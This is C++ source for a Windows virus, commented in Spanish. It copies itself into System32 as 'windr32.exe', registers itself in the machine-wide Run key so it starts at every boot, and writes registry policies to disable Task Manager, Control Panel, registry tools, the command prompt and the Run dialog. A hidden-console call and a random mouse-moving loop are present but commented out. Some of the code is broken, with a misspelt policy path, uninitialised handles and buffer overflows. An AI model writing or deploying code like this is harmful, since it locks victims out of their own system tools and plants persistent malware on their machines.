//CABECERA DEL PROGRAMA.
#include <iostream>
#include <windows.h> //LIBRERIA DE WINDOWS.
#include <stdio.h>

//DECLARACION DE LAS FUNCIONES DEL PROGRAMA.
void moverAleatorio();
int crearKey(char *path);
void copiarVirus(char *camino);
char *getRuta();
void bloquear(char *bloqueo);

//VARIABLES GLOBALES DEL PROGRAMA.
char *bloqueoUno = "DisableTaskMgr";//DESACTIVAR AL ADMINISTRADOR DE TAREAS.
char *bloqueoDos = "NoControlPanel"; //DESAPARECER EL PANEL DE CONTROL.
char *bloqueoTres = "DisableRegistryTools"; //DESACTIVAR EL REGISTRADOR DE EVENTOS.
char *bloqueoCuatro = "DisableCMD"; //DESACTIVAR EL CMD.
char *bloqueoCinco = "NoRun"; //DESACTIVAR EL EJECUTAR.




/*-------------------------FUNCION PRINCIPAL DEL PROGRAMA-------------------------*/
int main(int argc, char* argv[]){
	
	//FreeConsole(); //PARA QUE NO APARESCA LA CONSOLA DE WINDOWS AL EJECUTAR EL PROGRAMA.
	
	char *senda = getRuta();
	
	copiarVirus(senda);
	crearKey(senda);
	
	bloquear(bloqueoCuatro);
	/*while(true){
		moverAleatorio();
	}*/
	return 0;
}
/*-------------------------FIN DE LA FUNCION PRINCIPAL DEL PROGRAMA-------------------------*/




//ESTA FUNCION PERMITE COLOCAR EL PUNTERO DEL MOUSE EN CUALQUIER PARTE DE LA PANTALLA
//EN UN TIEMPO DETERMINADO.
void moverAleatorio(){
	int mx, my;
	long tiempo = 2000;
	
	mx = GetSystemMetrics(SM_CXSCREEN) - 1; //DA EL TAMAÑO DE LA PANTALLA POR EL EJE X MENOS 1.
	my = GetSystemMetrics(SM_CYSCREEN) - 1; //DA EL TAMAÑO DE LA PANTALLA POR EL EJE Y MENOS 1.
	
	//ESTA FUNCION RECIBE POR PARAMETRO EL EJE X Y EL EJE Y PARA COLOCAR EL PUNTERO EN LA PANTALLA.
	//A CADA EJE SE LE DA UN VALOR ALEATORIO PARA SU POSICION EN LA PANTALLA.
	SetCursorPos(1 + (rand() % mx), 1 + (rand() % my));
	
	//TIEMPO EN MILISEGUNDOS EN EL CUAL DURARA EL CURSOR EN CAMBIAR.
	//1 SEGUNDO ES IGUAL A 1000 MILISEGUNDOS.
	Sleep(tiempo);
	
}

//ESTA FUNCION DA LA RUTA EN LA CUAL SE CLONARA EL ARCHIVO O PROGRAMA.
char *getRuta(){
	//VARIABLE QUE GUARDA LA RUTA DE "C:\\WINDOWS".
	char *ruta = getenv("windir");
	
	strcat(ruta,"\\System32\\");//SE CONCATENA LA RUTA DE WINDOWS PARA ENTRAR A SYSTEM32.
	
	return ruta;
	
}

int crearKey(char *path){
	int regKey, check;
	HKEY hkey;//OBJETO O VARIABLE LA CUAL INSTANCIEA LA CREACION DE LA LLAVE.
	
	//VARIABLE QUE GUARDA UN NUMERO 0 DE EXITO O CUALQUIER OTRO NUMERO DE FRACASO.
	//SE GUARDA LA LLAVE EN EL SITIO ESPECIFICADO, LA CUAL SERA CREADA AUTOMATICAMENTE.
	regKey = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	
	//
	if(regKey == 0){
		//CREA UNA LLAVE EL CUAL SERA GUARADA COMO WIN32
		RegSetValueEx((HKEY)hkey, "windr32", 0, REG_SZ, (BYTE*)path, strlen(path));
		check = 0;
		return check;
	}
	
	if(regKey != 0){
		check = 1;
		return check;
	}
}

void copiarVirus(char *camino){
	char path[256]; //GUARDA DONDE ESTA EL EXE AL ABRIRLO POR PRIMERA VEZ
	char nombre[] = "windr32"; //GUARDA EL NOMBRE CON EL QUE SE VA A COPIAR
	strcat(nombre, ".exe"); //SE LE AÑADE EL .EXE AL NOMBRE.
	strcat(camino, nombre); //AL PARAMETRO CAMINO QUE ES LA RUTA PASADA SE LE AÑADE EL NOMBRE.
	
	HMODULE exe = GetModuleHandle(0); //MANEJADOR DE WINDOWS QUE COPIA EL VIRUS EN LA RUTA CAMINO.
	
	GetModuleFileName(exe, path, 256); //PARA DARLE UN VALOR A PATH QUE DA DONDE ESTA EL PROGRAMA POR PRIMERA VEZ
	CopyFile(path, camino, false); //COPIAR EL VIRUS.
}

void bloquear(char *bloqueo){
	try{ //INTENTA HACER LO QUE ESTA ADENTRO DE TRY. Y SI HAY ERROR MANDALO AL CATCH.
		HKEY hBuffer = NULL, hMyKey = NULL; //HKEY ES UNA LLAVE O UN HANDLE O MANEJADOR DEL REGISTRO.
		DWORD value = 1; //ES UNA MANERA DE ALMACENAR LOS ARCHIVOS EN EL REGISTRO DE WINDOWS.
		/*
		*BLOQUE DE IF QUE NOS PERMITE EVITAR LOS ERRORES QUE PUEDAN OCURRIR AL MOMENTO DE BLOQUEAR 
		*O DESACTIVAR A LAS CARACTERISTICAS DE WINDOWS.
		*/
		if(bloqueo == "DisableTaskMgr"){ //SI BLOQUEO ES IGUAL A DISABLETASKMGR ENTONCES.
			if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){ //SI NO HAY ERROR AL ABRIR LA LLAVE EN HEXADECIMAL ENTONCES
				//SI NO HAY ERROR AL MOMENTO DE CREAR LA LLAVE EN LA RUTA ESPECIFICADA ENTONCES
				if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsotf\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
					RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*) &value, sizeof(DWORD)); //FUNCION QUE ESCRIBE O DA LA LLAVE EN EL REGISTRO.
					RegCloseKey(hMyKey); //FUNCION QUE CIERRA EL MANEJADOR DE LA LLAVE EN EL REGISTRO.
				}
			}
		}
		
		if(bloqueo == "NoControlPanel"){
			if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
				if(RegCreateKeyEx(hMyKey, "Software\\Policies\\Microsotf\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
					RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*) &value, sizeof(DWORD));
					RegCloseKey(hMyKey);
				}
			}
		}
		
		if(bloqueo == "DisableRegistryTools"){
			if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
				if(RegCreateKeyEx(hMyKey, "Software\\Policies\\Microsotf\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
					RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*) &value, sizeof(DWORD));
					RegCloseKey(hMyKey);
				}
			}
		}
		
		if(bloqueo == "NoRun"){
			if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
				if(RegCreateKeyEx(hMyKey, "Software\\Policies\\Microsotf\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
					RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*) &value, sizeof(DWORD));
					RegCloseKey(hMyKey);
				}
			}
		}
		
		if(bloqueo == "DisableCMD"){
			if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
				if(RegCreateKeyEx(hMyKey, "Software\\Policies\\Microsotf\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
					RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*) &value, sizeof(DWORD));
					RegCloseKey(hMyKey);
				}
			}
		}
	}catch(...){
		
	}
}


